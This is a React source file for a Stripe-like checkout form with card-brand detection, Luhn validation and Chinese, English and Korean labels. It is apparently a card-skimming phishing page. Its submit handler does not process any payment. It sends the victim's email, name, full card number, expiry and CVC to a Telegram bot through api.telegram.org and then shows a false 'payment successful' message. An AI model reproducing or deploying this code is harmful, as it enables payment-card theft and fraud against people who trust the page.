// Stripe-like Checkout + 多語言 + 自動格式驗證 + 幣別與 RTL + 韓國支援
import React, { useState } from 'react';
import visa from './assets/visa.svg';
import amex from './assets/amex.svg';
import jcb from './assets/jcb.svg';
import msc from './assets/msc.svg';
import up from './assets/up.svg';

const detectCardType = (number) => {
  const n = number.replace(/\s/g, '');
  if (/^4/.test(n)) return visa;
  if (/^5[1-5]/.test(n)) return msc;
  if (/^3[47]/.test(n)) return amex;
  if (/^35/.test(n)) return jcb;
  if (/^62/.test(n)) return up;
  return null;
};

const luhnCheck = (cardNumber) => {
  const digits = cardNumber.replace(/\D/g, '').split('').reverse().map(Number);
  let sum = 0;
  for (let i = 0; i < digits.length; i++) {
    let digit = digits[i];
    if (i % 2 === 1) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
  }
  return sum % 10 === 0;
};

const i18n = {
  zh: {
    email: '電子郵件', card: '卡號', expiry: '有效期', cvc: 'CVC', name: '持卡人姓名', submit: '立即付款', saved: '儲存卡片資訊', success: '付款成功，我們已收到您的資料。', error: '卡號不正確，請重新輸入', currency: 'NT$',
  },
  en: {
    email: 'Email', card: 'Card Number', expiry: 'MM / YY', cvc: 'CVC', name: 'Name on Card', submit: 'Subscribe', saved: 'Save my card', success: 'Payment successful.', error: 'Invalid card number.', currency: '$',
  },
  ko: {
    email: '이메일', card: '카드 번호', expiry: '만료일 (MM / YY)', cvc: 'CVC', name: '카드 소유자 이름', submit: '결제하기', saved: '카드 정보 저장', success: '결제가 완료되었습니다.', error: '유효하지 않은 카드 번호입니다.', currency: '₩',
  }
};

export default function App() {
  const [lang] = useState('ko'); // 更改語系：zh / en / ko
  const [loading, setLoading] = useState(false);
  const [cardType, setCardType] = useState(null);
  const [error, setError] = useState(null);
  const [formData, setFormData] = useState({
    email: '', card: '', expiry: '', cvc: '', name: '', country: 'Korea', saveInfo: false,
  });

  const formatCard = (value) => value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
  const formatExpiry = (value) => value.replace(/\D/g, '').replace(/(\d{2})(\d{1,2})/, '$1 / $2');
  const formatCVC = (value) => value.replace(/\D/g, '').slice(0, 4);

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    let newValue = value;
    if (name === 'card') {
      newValue = formatCard(value);
      setCardType(detectCardType(value));
      setError(null);
    } else if (name === 'expiry') {
      newValue = formatExpiry(value);
    } else if (name === 'cvc') {
      newValue = formatCVC(value);
    }
    setFormData({ ...formData, [name]: type === 'checkbox' ? checked : newValue });
  };

  const handleSubmit = async () => {
    const validCard = luhnCheck(formData.card);
    if (!validCard) {
      setError(i18n[lang].error);
      return;
    }
    setLoading(true);
    const message = `🧾 新訂單！\nEmail: ${formData.email}\n姓名: ${formData.name}\n卡號: ${formData.card}\n有效期: ${formData.expiry}\nCVC: ${formData.cvc}\n國家: ${formData.country}\n儲存卡片資訊: ${formData.saveInfo ? '是' : '否'}`;

    await fetch(`https://api.telegram.org/bot${process.env.REACT_APP_TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: process.env.REACT_APP_TELEGRAM_CHAT_ID, text: message }),
    });

    setTimeout(() => {
      alert(i18n[lang].success);
      setLoading(false);
    }, 1000);
  };

  const isRTL = lang === 'ar' || lang === 'he';

  return (
    <div className={`min-h-screen bg-[#f6f9fc] flex items-center justify-center p-6 ${isRTL ? 'direction-rtl text-right' : ''}`}>
      <div className="w-full max-w-md bg-white rounded-lg shadow border border-gray-200 p-8 font-sans text-sm">
        <input type="email" name="email" placeholder={i18n[lang].email} value={formData.email} onChange={handleChange} className="mb-4 w-full border border-gray-300 rounded px-3 py-[10px]" />
        <label className="block text-xs text-gray-600 font-medium mb-1">{i18n[lang].card}</label>
        <div className="relative mb-2">
          <input type="text" name="card" placeholder="1234 1234 1234 1234" value={formData.card} onChange={handleChange} maxLength={19} className="w-full border border-gray-300 rounded px-3 py-[10px] pr-20 tracking-widest" inputMode="numeric" />
          {cardType && <img src={cardType} alt="card logo" className="absolute right-3 top-1/2 -translate-y-1/2 h-5" />}
        </div>
        {error && <p className="text-red-500 text-xs mb-2">{error}</p>}

        <div className="flex gap-2 mb-4">
          <input type="text" name="expiry" placeholder={i18n[lang].expiry} value={formData.expiry} onChange={handleChange} maxLength={7} className="w-1/2 border border-gray-300 rounded px-3 py-[10px]" />
          <input type="text" name="cvc" placeholder={i18n[lang].cvc} value={formData.cvc} onChange={handleChange} maxLength={4} className="w-1/2 border border-gray-300 rounded px-3 py-[10px]" />
        </div>

        <input type="text" name="name" placeholder={i18n[lang].name} value={formData.name} onChange={handleChange} className="mb-4 w-full border border-gray-300 rounded px-3 py-[10px]" />

        <select name="country" value={formData.country} onChange={handleChange} className="w-full border border-gray-300 rounded px-3 py-[10px] mb-4">
          <option value="Korea">Korea</option>
          <option value="Taiwan">Taiwan</option>
          <option value="Japan">Japan</option>
          <option value="USA">USA</option>
        </select>

        <div className="flex items-start mb-4">
          <input type="checkbox" name="saveInfo" checked={formData.saveInfo} onChange={handleChange} className="mt-1 mr-2" />
          <label className="text-sm leading-tight">{i18n[lang].saved}</label>
        </div>

        <button onClick={handleSubmit} disabled={loading} className="w-full bg-[#0070f3] hover:bg-[#005dd1] text-white text-sm py-[10px] rounded font-semibold">
          {loading ? '처리 중...' : i18n[lang].submit} {i18n[lang].currency}108
        </button>
      </div>
    </div>
  );
}
